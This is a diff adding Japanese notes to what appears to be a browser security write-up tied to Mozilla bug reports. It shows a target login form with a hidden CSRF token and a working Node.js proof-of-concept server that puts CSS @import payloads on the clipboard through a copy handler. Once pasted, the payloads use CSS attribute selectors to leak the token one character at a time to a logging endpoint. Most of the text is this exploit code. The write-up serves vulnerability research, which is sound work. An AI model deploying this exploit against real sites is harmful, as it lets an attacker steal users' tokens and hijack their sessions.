@@ -134,3 +134,138 @@ https://bugzilla.mozilla.org/attachment.cgi?id=9111317&action=edit
 https://bugzilla.mozilla.org/attachment.cgi?id=9111318&action=edit
 
 
+
+
+#### 攻撃対象ページ
+```html
+<form action=javascript:void(0)>
+    <input id=csrftoken name=csrftoken type=hidden>
+    Login: <input name=login><br>
+    Password: <input name=password type=password><br>
+    <button>Submit</button>
+</form>
+
+
+<script>
+    let csrf = btoa(new TextDecoder().decode(window.crypto.getRandomValues(new Uint8Array(32)).map(c=>c%127)));
+    document.querySelector('#csrftoken').setAttribute('value', csrf);
+</script>
+```
+
+インジェクションできる場所がない普通のFormページ
+
+#### PoC Page
+
+重要な点は
+Copy でCSSを含んだPoCをコピー
+Paste部分では特別何もやっておらず、CSS @import が注入できる
+
+あとはCSS Injection で、InputのValueに１文字ずつマッチしてパラメータを盗み、
+外部のロギングサーバに @import のURLでリクエストを送るようにする。
+
+
+```
+app.get('/', (req, res) => {
+    res.set('content-type', 'text/html');
+    res.send(`<!doctype html>
+        Click <button onclick="document.execCommand('copy')">Copy</button> and paste the
+        clipboard in the vulnerable page<br>
+        <span id=output style=color:red></span>
+        
+        <script>
+        
+        function randomId(len=16) {
+            return Array.from(crypto.getRandomValues(new Uint8Array(len))).map(x=>('00'+x.toString(16)).slice(-2)).join('')
+        }
+        
+        document.oncopy = ev => {
+            ev.preventDefault();
+            const id = randomId();
+            const len = 100;
+            const base = \`https://localhost:3000/css/\${id}\`;
+            const data = [\`<style>@import'\${base}?len=\${len}'</style>\`]
+            .concat(Array.from({ length: len }, (_, i) => {
+                return \`<style>@import'';@namespace x url("\\\\22x);@import '\${base}/\${i}';")  </style>\`;
+            })).join('\\n');
+            ev.clipboardData.setData('text/html', data);
+            ev.clipboardData.setData('text/plain', data);
+            output.textContent = 'Ok! Now paste it!.';
+        }
+        </script>
+        
+    `);
+});
+
+app.get('/char/:session/:index', (req, res) => {
+    let {
+        session,
+        index
+    } = req.params;
+    let {
+        char
+    } = req.query;
+    index = +index;
+    sessions[session][index] = char;
+
+    console.log(` [*][session=${session}] Exfiltrated value: ${sessions[session].join('')}`);
+
+    res.send('');
+});
+
+
+function cssEscape(s) {
+    return Array.from(s).map(c => `\\${('000000'+c.codePointAt(0).toString(16)).slice(-6)}`).join('');
+}
+
+
+/* 以下便利関数 */
+function urlEscape(s) {
+    return encodeURIComponent(s).replace(/'/g, '%27');
+}
+
+// returns css exfiltrating data
+app.get('/css/:session/:index', async(req, res) => {
+            let {
+                session,
+                char,
+                index
+            } = req.params;
+            index = +index;
+            res.set('content-type', 'text/css');
+            await forChar(index, session);
+
+            let chars = '0123456789/+=qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
+            const content = `
+        
+        ${Array.from(chars).map(c => `INPUT[name='csrftoken'][value^='${cssEscape(sessions[session].slice(0, index).join('')+c)}'] + * {
+            background: url('https://127.0.0.1:3000/char/${session}/${index}?char=${urlEscape(c)}');
+        }`).join('\n')}
+    `;
+    
+    res.send(content);
+    
+    
+});
+
+// creates new exfiltration session
+app.get('/css/:session', (req, res) => {
+    const { session } = req.params;
+    const { len } = req.query;
+    console.log(`[!] Imported! ${session}`)
+    sessions[session] = new Array(+len).fill('');
+    
+    res.set('content-type', 'text/css');
+    return res.send(`
+        ${Array.from({length: +len}, (_,k) => `@import '/css/${session}/${k}';`).join('\n')};
+    `);
+    
+})
+
+const options = {
+  cert: fs.readFileSync('localhost-cert.pem'),
+  key: fs.readFileSync('localhost-privkey.pem'),
+}
+
+spdy.createServer(options, app).listen(port, () => console.log(`App listening on https://localhost:${port} and https://127.0.0.1:${port}!`));
+```
+
